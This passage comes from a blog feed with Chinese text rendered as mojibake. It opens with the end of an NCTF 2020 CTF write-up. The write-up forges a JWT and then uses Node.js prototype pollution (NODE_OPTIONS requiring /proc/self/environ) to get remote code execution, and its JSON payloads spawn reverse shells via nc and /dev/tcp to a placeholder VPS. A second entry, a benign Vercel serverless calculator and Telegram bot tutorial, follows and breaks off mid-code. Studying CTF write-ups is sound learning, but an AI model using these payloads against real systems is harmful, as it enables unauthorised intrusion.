string">"exec(<span class="token entity" title="\&quot;">\"</span>import base64, binascii<span class="token entity" title="\n">\n</span>print base64.urlsafe_b64encode(binascii.a2b_hex('2eeceba7b1828a217aa00ca6795bcaa1ca2f2391e731362b1f5ac1084f11966d')).replace('=','')<span class="token entity" title="\&quot;">\"</span>)"</span>Luzrp7GCiiF6oAymeVvKocovI5HnMTYrH1rBCE8Rlm0</code></pre><p>æ‹¼æ¥å¾—åˆ° JWT.</p><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0.Luzrp7GCiiF6oAymeVvKocovI5HnMTYrH1rBCE8Rlm0</code></pre><p>æŠŠ cookie é‡Œçš„ <code>auth</code> ä¿®æ”¹ä¸ºå¦‚ä¸Šï¼ŒæˆåŠŸè®¿é—® <code>/debug/cwd</code>ï¼Œç»“åˆ <code>checkcwd.js</code> æç¤ºå½“å‰ç›®å½•ä¸º <code>/app</code>ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> cwd<span class="token operator">=</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>cwd <span class="token operator">==</span> <span class="token string">'/app'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'You are in the /app directory.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'You are not in the /app directory.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122222024063.png" alt="cwd"></p><p>æˆåŠŸåˆ©ç”¨ POST è¯·æ±‚ä¿®æ”¹é¡µé¢å†…å®¹ã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122221914400.png" alt="post"></p><p>æ¥ä¸‹æ¥è€ƒè™‘ <strong>æ±¡æŸ“åŸå‹é“¾</strong>ã€‚</p><p><code>rep.replicate(a, b)</code> å‡½æ•°æ˜¯å°† <code>b</code> ä¸­çš„æ¯ä¸€é¡¹å†…å®¹é€’å½’åœ°èµ‹å€¼ç»™ <code>a</code>ã€‚</p><p>å‚è€ƒ <a href="https://nodejs.org/api/child_process.html#child_process_child_process_fork_modulepath_args_options">NodeJS child_process å®˜æ–¹æ–‡æ¡£</a>ï¼Œä»¥åŠ <a href="https://xz.aliyun.com/t/6755">ä»Kibana-RCEå¯¹nodejså­è¿›ç¨‹åˆ›å»ºçš„æ€è€ƒ</a> ä¸€æ–‡ï¼Œå¯ä»¥æŠŠ <code>Object.env</code> ç»™æ±¡æŸ“æ‰ã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122222237931.png" alt="å‚è€ƒ"></p><blockquote><p>nodeç‰ˆæœ¬&gt;v8.0.0ä»¥åæ”¯æŒè¿è¡Œ node æ—¶å¢åŠ ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°<code>NODE_OPTIONS</code>ï¼Œå®ƒèƒ½å¤ŸåŒ…å«ä¸€ä¸ªjsè„šæœ¬ï¼Œç›¸å½“äº<code>include</code>ã€‚</p></blockquote><p>è€Œ Linux ä¸­çš„ç¯å¢ƒå˜é‡ä¹Ÿä¼šå­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå…·ä½“åœ¨ <code>/proc/self/environ</code>ã€‚</p><p>å†æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤æ‰”å¦ä¸€ä¸ª<code>env</code>ç¯å¢ƒå˜é‡é‡Œï¼Œå½“ fork æ‰§è¡Œæ–°è¿›ç¨‹æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œä»è€Œå®ç° RCEã€‚</p><p><strong>Payload:</strong></p><p>è¿™é‡Œç›´æ¥åå¼¹ shell äº†ã€‚</p><p>POST <a href="http://42.192.72.11:8092/api/package">http://42.192.72.11:8092/api/package</a></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"MiaoTony"</span><span class="token punctuation">,</span> <span class="token property">"description"</span><span class="token operator">:</span><span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"env"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"AAAA"</span><span class="token operator">:</span><span class="token string">"require(\"child_process\").exec('nc VPSIP PORT -e /bin/sh')//"</span><span class="token punctuation">,</span> <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>æˆ–è€…</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"MiaoTony"</span><span class="token punctuation">,</span> <span class="token property">"description"</span><span class="token operator">:</span><span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"env"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"AAAA"</span><span class="token operator">:</span><span class="token string">"require(\"child_process\").exec(\"bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1\")//"</span><span class="token punctuation">,</span> <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>åœ¨ VPS ä¸Šç›‘å¬ç«¯å£ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvvp PORT</code></pre><p>è€Œåè®¿é—® <a href="http://42.192.72.11:8092/debug/cwd">http://42.192.72.11:8092/debug/cwd</a> è§¦å‘ <code>fork</code>ã€‚</p><p>åœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ° flagã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122223040787.png" alt="flag"></p><p><code>NCTF{https://xz.aliyun.com/t/6755_f0rk_p1us_prot0type_p0llution_1quals_RCE...???}</code></p><p>ï¼ˆå¥½å·§å•Šï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åŒä¸€ç¯‡æ–‡ç«  23333</p><p>é¡ºä¾¿çœ‹äº†ä¸€çœ¼ <code>package.json</code> ã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122223204062.png" alt="package.json"></p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122223408464.png" alt="ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿"></p><p>è¦ä¸æ˜¯æƒé™é—®é¢˜å°±èƒ½æŠŠ <code>package.json</code> ç»™æ”¹äº†<em>ï¼ˆå¤§é›¾</em></p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122223953094.png" alt="å®šæ—¶é‡å¯"></p><p>å®šæ—¶é‡å¯è¿˜æ˜¯æŒºæ–‡æ˜çš„ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å½©è›‹"><a href="#å½©è›‹" class="headerlink" title="å½©è›‹"></a>å½©è›‹</h3><p>å…³æ³¨å…¬ä¼—å· å›å¤ flag å°±æ‹¿åˆ°äº†ã€‚</p><p><code>NCTF{We1c0m3_t0_NCTF2020}</code></p><p>ï¼ˆåæ§½ä¸€å¥ï¼Œå¸ˆå‚…ä»¬ç©ºé—´é‡Œè½¬çš„æ ¡å†…æ¨ªå¹…å±…ç„¶å¤šäº†ä¸ª <code>!</code>ï¼Œå°±ç¦»è°±ã€‚</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122173629426.png" alt="æ ¡å†…æ¨ªå¹…"></p><h3 id="NCTF2020é—®å·è°ƒæŸ¥"><a href="#NCTF2020é—®å·è°ƒæŸ¥" class="headerlink" title="NCTF2020é—®å·è°ƒæŸ¥"></a>NCTF2020é—®å·è°ƒæŸ¥</h3><p><code>NCTF{Let's_look_forward_to_X1CTF}</code></p><p>è¿™å°±é”¤çˆ† fmyyï¼</p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><img src="/2020/11/23/CTF_2020NJUPTCTF/TotalRanking.png" alt="æ€»æ¦œ"></p><p>åœ¨è€—å­é”…é”…å’Œç§¦å¸ˆå‚…çš„å¸¦é¢†ä¸‹ï¼Œæ‹¿åˆ°äº†æ€»æ¦œç¬¬å…­ã€‚</p><p>Team H4rdwo3k1ng </p><p>ğŸ€å“¥å“¥è¯´ä»–å¤ªæ¿€åŠ¨äº†å¤šæ‰“äº†ä¸ª Team <em>ï¼ˆç„¶åè¿˜æ”¹ä¸äº† x</em></p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/RankingWall.png" alt="rankingWall"></p><p>å‘œå‘œå‘œï¼Œå·®ç‚¹å°±èƒ½æ‹¿ Xray é«˜çº§ç‰ˆ license äº†ï¼ˆï¼ˆï¼ˆè¿˜æ˜¯å¤ªèœäº†å•Š</p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201123212953135.png" alt="reward"></p><p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™æ¬¡ NCTF 2020 è¿˜æ˜¯æŒºå¥½ç©çš„ï¼Œé¢˜ç›®è´¨é‡ä¸é”™ã€‚</p><p>å°±æ˜¯<strong>æ²¡æœ‰çœŸæ­£çš„ Misc é¢˜ï¼Œç¡¬è‚ Web é¢˜å¤ªéš¾é¡¶äº†</strong>ã€‚ä¸è¿‡å­¦åˆ°äº†ä¸å°‘å€’æ˜¯äº†å˜¿å˜¿ã€‚</p><p>ä¸‹æ¬¡æœ‰æœºä¼šçš„è¯å†æ¥ç©w~</p><p>å™¢å¯¹äº†ï¼Œå»çº¿ä¸‹ä¸€å®šé”¤çˆ† fmyyï¼</p><blockquote><p>BTW, <a href="https://ctf.njupt.edu.cn/562.html">å®˜æ–¹ WriteUp</a> ä¹Ÿå‡ºæ¥äº†ã€‚</p><p>Web é¢˜ç›®ç¯å¢ƒ GitHub repo: baiyecha404 / <strong><a href="https://github.com/baiyecha404/My-NCTF2020-Challs">My-NCTF2020-Challs</a></strong>  </p></blockquote><p>ï¼ˆæºœäº†æºœäº†å–µ~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºVercel Serverlesséƒ¨ç½²Calc114514 API &amp; Telegram bot</title>
      <link href="2020/11/18/Server_Vercel_Calc114514/"/>
      <url>2020/11/18/Server_Vercel_Calc114514/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Preface-å‰è¨€"><a href="#0x00-Preface-å‰è¨€" class="headerlink" title="0x00 Preface å‰è¨€"></a>0x00 Preface å‰è¨€</h2><p>æœ€è¿‘ï¼Œå—åˆ° USTC Hackergame 2020ï¼ˆä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬ä¸ƒå±Šä¿¡æ¯å®‰å…¨å¤§èµ›ï¼‰è¶…ç²¾å·§çš„æ•°å­—è®ºè¯å™¨ ä¸€é¢˜å¯å‘ï¼Œå¯»æ€ç€å’±å¯ä»¥æ•´ä¸€ä¸ªç½‘é¡µç‰ˆæœ¬ / Telegram bot ç‰ˆæœ¬çš„ 114514 æ•°å­—è®ºè¯å™¨ã€‚</p><blockquote><p>See also: <a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/">USTC Hackergame 2020 WriteUp by MiaoTony</a></p></blockquote><p>è¯´å¹²å°±å¹²ï¼Œè€ƒè™‘åˆ° Vercel æœ‰ä¸ª Serverless Function æœåŠ¡ï¼Œä¹‹å‰ä¹Ÿå°è¯•è¿‡åœ¨ä¸Šé¢æ­ API<em>ï¼ˆè™½ç„¶é‚£æ—¶ç”±äºæ‰§è¡Œæ—¶é—´é™åˆ¶ç­‰åŸå› æ²¡ç”¨ä¸Šï¼‰</em>ï¼Œè¿™æ¬¡çš„ 114514 è®ºè¯å®é™…ä¸Šå¹¶ä¸å¤æ‚ï¼Œäºæ˜¯å°±æ¥æ•´ä¸€ä¸ªå§ï¼</p><p><em>ï¼ˆServerless çœŸé¦™ï¼</em></p><hr><h2 id="0x01-TL-DR"><a href="#0x01-TL-DR" class="headerlink" title="0x01 TL; DR"></a>0x01 TL; DR</h2><p>ç›´æ¥è¯´<strong>å¦‚ä½•ä½“éªŒ</strong>ï¼Œå…·ä½“å¦‚ä½•å®ç°åé¢å†å±•å¼€ã€‚</p><p>å‰åç«¯åˆ†ç¦»ï¼Œå‡éƒ¨ç½²åœ¨ Vercelã€‚</p><p><strong>å‰ç«¯ï¼š</strong><a href="https://calc114514.vercel.app/?from=blog">https://calc114514.vercel.app/</a></p><p><strong>Telegram bot:</strong> <a href="https://t.me/calc114514bot">@calc114514bot</a>.</p><p>é¡¹ç›®å¼€æºåœ¨ GitHub ä¸Šï¼š<a href="https://github.com/miaotony/calc114514">https://github.com/miaotony/calc114514</a></p><p><strong>æ¬¢è¿æ¥ç‚¹ä¸ª Star å–µ~</strong></p><h3 id="API-å¼€æ”¾æ¥å£"><a href="#API-å¼€æ”¾æ¥å£" class="headerlink" title="API å¼€æ”¾æ¥å£"></a>API å¼€æ”¾æ¥å£</h3><blockquote><p><strong>GET / POST</strong> <a href="https://calc114514.vercel.app/api/calc">https://calc114514.vercel.app/api/calc</a></p></blockquote><p><strong>Param:</strong></p><p><code>num</code> a number here.</p><p><code>isJson</code> Optional. If <code>1</code>, return the result(s) with <code>JSON</code> format, else return <code>text/plain</code> result.</p><p><strong>Return:</strong></p><p>See examples below.</p><p><strong>Examples:</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> <span class="token string">"https://calc114514.vercel.app/api/calc?num=114514"</span>-~-~-~-~<span class="token punctuation">(</span>-~<span class="token punctuation">(</span>-~-~-~-~-~<span class="token punctuation">(</span>-~-~-~-~<span class="token punctuation">(</span>-~<span class="token punctuation">(</span>-~~-1*-~-~-~-~-~-~-~-~-~1<span class="token punctuation">)</span>*-~-~-~-~-~-~4<span class="token punctuation">)</span>*-~-~-~-~-~5<span class="token punctuation">)</span>*-~-~-~-~-~-~-~-~-~1<span class="token punctuation">)</span>*-~-~-~-~-~-~4<span class="token punctuation">)</span>$ <span class="token function">curl</span> <span class="token string">"https://calc114514.vercel.app/api/calc?isJson=1&amp;num=114514"</span><span class="token punctuation">{</span><span class="token string">"answer"</span><span class="token builtin class-name">:</span><span class="token string">"-~-~-~-~(-~(-~-~-~-~-~(-~-~-~-~(-~(-~~-1*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)*-~-~-~-~-~5)*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)"</span>,<span class="token string">"number"</span><span class="token builtin class-name">:</span><span class="token string">"114514"</span><span class="token punctuation">}</span></code></pre><h3 id="Telegram-bot"><a href="#Telegram-bot" class="headerlink" title="Telegram bot"></a>Telegram bot</h3><p>See <a href="https://t.me/calc114514bot">@calc114514bot</a>.</p><p><strong>Usage:</strong></p><ol><li>Send a number to @calc114514bot. ç›´æ¥ç»™æœºå™¨äººå‘æ•°å­—ã€‚</li><li>Use inline query method, <code>@calc114514bot &lt;Number Here&gt;</code> . åœ¨ä»»æ„çš„è¾“å…¥æ¡†è¾“å…¥ <code>@calc114514bot ä½ æƒ³è®ºè¯çš„æ•°å­—</code>ã€‚</li></ol><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112224730824.png" alt="Inline query"></p><p>ç¬¬ä¸€ä¸ªä¸å¸¦åŸæ•°ï¼Œç¬¬äºŒä¸ªå¸¦åŸæ•°ï¼Œæ•ˆæœåˆ†åˆ«å¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112224905498.png"></p><hr><h2 id="0x02-Review-of-the-question-é¢˜ç›®å›é¡¾"><a href="#0x02-Review-of-the-question-é¢˜ç›®å›é¡¾" class="headerlink" title="0x02 Review of the question é¢˜ç›®å›é¡¾"></a>0x02 Review of the question é¢˜ç›®å›é¡¾</h2><blockquote><p>æ•°å­—è®ºè¯æ˜¯ä¸€ç§å¸¸è§çš„å®šç†è¯æ˜æ–¹æ³•ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¯¹äºç»™å®šçš„è‡ªç„¶æ•°ï¼Œæ‰¾å‡ºä¸€ä¸ªç­‰å€¼çš„è¡¨è¾¾å¼ï¼Œå¦‚æœè¯¥è¡¨è¾¾å¼å»é™¤æ‰€æœ‰ç¬¦å·éƒ¨åˆ†åä¸ºå­—ç¬¦ä¸²ã€Œ114514ã€ï¼Œåˆ™å®Œæˆè®ºè¯ã€‚è¡¨è¾¾å¼ä»…å…è®¸æ•´æ•°è¿ç®—ï¼Œå¯ä»¥ä½¿ç”¨æ‹¬å·ã€å¸¸è§çš„ä»£æ•°è¿ç®—ç¬¦ <code>+-*/%</code> å’Œä½è¿ç®—ç¬¦ <code>~^&amp;|</code>ã€‚</p><p><em>Via: USTC Hackergame 2020</em></p></blockquote><p>Calculate a number with <code>114514</code> &amp; some operators.</p><p>äºæ˜¯æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨ <code>114514</code> åŠ<strong>ä¸€äº›è¿ç®—ç¬¦</strong>æ„é€ å‡ºæ‰€ç»™çš„æ•°å­—ã€‚</p><p><strong>See also:</strong>  <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E8%B6%85%E7%B2%BE%E5%B7%A7%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%BA%E8%AF%81%E5%99%A8/README.md">è¶…ç²¾å·§çš„æ•°å­—è®ºè¯å™¨ (official writeup)</a></p><hr><h2 id="0x03-Demonstration-method-è®ºè¯ç®—æ³•"><a href="#0x03-Demonstration-method-è®ºè¯ç®—æ³•" class="headerlink" title="0x03 Demonstration method  è®ºè¯ç®—æ³•"></a>0x03 Demonstration method  è®ºè¯ç®—æ³•</h2><h3 id="å…­ä½æ•°ä»¥å†…è®ºè¯æ–¹æ³•"><a href="#å…­ä½æ•°ä»¥å†…è®ºè¯æ–¹æ³•" class="headerlink" title="å…­ä½æ•°ä»¥å†…è®ºè¯æ–¹æ³•"></a>å…­ä½æ•°ä»¥å†…è®ºè¯æ–¹æ³•</h3><p>åœ¨ä¸è¶…è¿‡6ä½æ•°ï¼Œå³ <code>0 &lt;= num &lt;= 999999</code> çš„è®ºè¯ä¸Šï¼Œå‚è€ƒäº† <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E8%B6%85%E7%B2%BE%E5%B7%A7%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%BA%E8%AF%81%E5%99%A8/README.md">å®˜æ–¹ WriteUp</a> é‡Œçš„ç®—æ³•ã€‚</p><p><strong>é‡è¦æ€§è´¨ï¼š</strong></p><p><code>-~x == x+1</code><br><code>~-x == x-1</code> å¯¹äºä»»æ„ <code>x</code> éƒ½æˆç«‹ã€‚</p><blockquote><p>ä¸€ä¸ªåŠæ³•å°±æ˜¯<strong>æŒ‰ç…§åè¿›åˆ¶çš„æ–¹å¼æ¥å‡‘</strong>ï¼Œå³ <code>given_number = (((((((0+a)*10+b)*10+c)*10+d)*10)+e)*10)+f</code> ï¼Œå…¶ä¸­ <code>a b c d e f</code> ä¸º 0 åˆ° 9 ä¹‹é—´çš„æ•´æ•°ã€‚è¡¨è¾¾å¼ä¸­çš„å€¼ <code>0 10 10 10 10 10</code> å¯ä»¥åˆ†åˆ«åˆ©ç”¨ <code>1 1 4 5 1 4</code> ä¸åµŒå¥— <code>~-</code> æ¥å‡‘å‡ºï¼Œè€Œ <code>+a +b +c +d +e +f</code> å¯ä»¥ç›´æ¥åˆ©ç”¨åµŒå¥— <code>~-</code> æ¥å®ç°ï¼ˆä¸éœ€è¦ä½¿ç”¨æ•°å­—ï¼‰ã€‚</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getans</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Get the answer using `114514` &amp; `-~`, `~-`.    å‚è€ƒå®˜æ–¹ WriteUpï¼ŒåŸºäºåè¿›åˆ¶åˆ†è§£å®ç°ï¼Œæ”¯æŒ6ä½åŠä»¥ä¸‹æ•°å­—    """</span>    jz <span class="token operator">=</span> <span class="token number">10</span>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token string">"114514"</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> e<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"~-"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> c<span class="token punctuation">)</span>  <span class="token comment"># value is zero</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"-~"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>jz <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> c<span class="token punctuation">)</span>  <span class="token comment"># value is jz</span>    ans <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        digit <span class="token operator">=</span> <span class="token punctuation">(</span>number <span class="token operator">//</span> <span class="token punctuation">(</span>jz <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> jz        ans <span class="token operator">=</span> <span class="token string">"("</span> <span class="token operator">+</span> ans <span class="token operator">+</span> <span class="token string">"*"</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span> <span class="token keyword">if</span> i <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">else</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        ans <span class="token operator">=</span> <span class="token string">"-~"</span> <span class="token operator">*</span> digit <span class="token operator">+</span> ans    <span class="token keyword">return</span> ans</code></pre><h3 id="è¶…è¿‡å…­ä½æ•°çš„è®ºè¯æ–¹æ³•"><a href="#è¶…è¿‡å…­ä½æ•°çš„è®ºè¯æ–¹æ³•" class="headerlink" title="è¶…è¿‡å…­ä½æ•°çš„è®ºè¯æ–¹æ³•"></a>è¶…è¿‡å…­ä½æ•°çš„è®ºè¯æ–¹æ³•</h3><p>å¯¹äºæ‰€ç»™æ•´æ•°<code>n</code>ï¼Œé‡‡ç”¨ä¸åè¿›åˆ¶ç±»ä¼¼çš„æ–¹æ³•ï¼Œåœ¨ $ n^{1/6} $ é™„è¿‘å–å…­ä¸ªæ•°ï¼Œæ¯ä½å–ä¸åŒè¿›åˆ¶ï¼Œæœ€åå†å‡‘åˆ°æ‰€ç»™çš„æ•°ã€‚</p><p><em>ï¼ˆTODOï¼‰</em></p><hr><h2 id="0x04-éƒ¨ç½²-API-æ¥å£"><a href="#0x04-éƒ¨ç½²-API-æ¥å£" class="headerlink" title="0x04 éƒ¨ç½² API æ¥å£"></a>0x04 éƒ¨ç½² API æ¥å£</h2><p>å…¶å®å†™ä¸ªæ¥å£çš„è¯å¹¶ä¸éš¾ï¼Œä¸ªäººä¹ æƒ¯å°±ä½¿ç”¨ Python3 åŠ Flask è¿›è¡Œå¼€å‘äº†ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯æŠŠè·¯ç”±é…å¥½ï¼Œæ‰€éœ€çš„å‚æ•°ä¼ è¿›æ¥ï¼Œä¸¢åˆ°å¤„ç†çš„å‡½æ•°é‡Œï¼ŒæŠŠç»“æœå†æŒ‰ç…§éœ€æ±‚è¿”å›ç»™ç”¨æˆ·å°±å®Œäº‹äº†ã€‚</p><p>ä½†æ˜¯åˆä¸æƒ³ä¸ºäº†è¿™ç©æ„å„¿å°±æ•´ä¸ªæœåŠ¡å™¨ï¼Œä¹Ÿæ‡’å¾—è¿ç»´ï¼Œäºæ˜¯æƒ³åˆ°äº†ä»¥ Serverless æ— æœåŠ¡å™¨ çš„å½¢å¼è¿›è¡Œéƒ¨ç½²ã€‚</p><p>å¸¸è§çš„ Serverless æœåŠ¡ä¹ŸæŒºå¤šï¼Œæ¯”å¦‚ AWS Lambda, Heroku, Cloudflare Workers, Vercel, etc.</p><p>è¿™é‡Œå°±ç”¨ <strong>Vercel</strong> æ¥å®ç°å§ã€‚</p><h3 id="Vercel-ä»‹ç»"><a href="#Vercel-ä»‹ç»" class="headerlink" title="Vercel ä»‹ç»"></a>Vercel ä»‹ç»</h3><blockquote><p>Vercel is the optimal workflow for frontend teams. All-in-one: Static and Jamstack deployment, Serverless Functions, and Global CDN.</p><p>Vercel is a cloud platform for <strong>static sites</strong> and <strong>Serverless Functions</strong> that fits perfectly with your workflow. It enables developers to host Jamstack websites and web services that deploy instantly, scale automatically, and requires no supervision, all with no configuration.</p></blockquote><p>å®˜ç½‘å°±æ˜¯ <a href="https://vercel.com/">https://vercel.com</a></p><p>å®ƒæ˜¯ä¸€ä¸ªæä¾›äº†é™æ€èµ„æºå’Œ Serverless å‡½æ•°æœåŠ¡çš„äº‘å¹³å°ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªç½‘ç«™ä¸Šè¿›è¡Œéƒ¨ç½²ã€‚</p><p>å¯¹äº Vue.js / Next.js / Hexo / Hugo / â€¦ ç­‰ç­‰ä¸»æµå‰ç«¯æ¡†æ¶ï¼Œä½ åªéœ€è¦æŠŠåŸå§‹ä»£ç ä¸Šä¼ ï¼ŒæŒ‡å®šå¥½ä¾èµ–ï¼Œå®ƒå°±èƒ½å¸®ä½ æ„å»ºé™æ€æ–‡ä»¶ï¼Œè‡ªåŠ¨å®Œæˆéƒ¨ç½²ã€‚</p><p>å®ƒæ”¯æŒ GitHubã€GitLab å’Œ Bitbucket é›†æˆï¼Œä¹Ÿæ”¯æŒé€šè¿‡å‘½ä»¤è¡Œ CLI å·¥å…·è¿›è¡Œéƒ¨ç½²ã€‚</p><p>è€Œä¸” <a href="https://vercel.com/pricing">ä¸ªäººç‰ˆæœ¬æ˜¯æ°¸è¿œå…è´¹çš„</a>ï¼<a href="https://vercel.com/docs/platform/limits">å¹³å°é™åˆ¶</a> ä¹Ÿå¾ˆå®½è£•ã€‚</p><p>æ›´å¤šä»‹ç»è¯¦è§ <a href="https://vercel.com/docs/introduction">å®˜æ–¹ä»‹ç»æ–‡æ¡£</a>ã€‚</p><p>Vercel å°±æ˜¯ä»¥å‰çš„ ZEITï¼Œå…¶å‘½ä»¤è¡Œå·¥å…·å°±æ˜¯ <code>vercel</code>ï¼Œä»¥å‰æ˜¯ <code>now</code>ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å®‰è£…å‘½ä»¤è¡Œå·¥å…·ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i -g vercel</code></pre><p>çœ‹ä¸€ä¸‹ç‰ˆæœ¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ vercel --versionVercel CLI <span class="token number">20.1</span>.4<span class="token number">20.1</span>.4</code></pre><p>åˆæ¬¡ä½¿ç”¨éœ€è¦ç™»å½•ï¼Œè¾“å…¥é‚®ç®±ï¼Œè€Œåç‚¹å‡»é‚®ä»¶é‡Œçš„é“¾æ¥è¿›è¡Œæˆæƒã€‚</p><pre class="language-bash" data-language="bash"><code 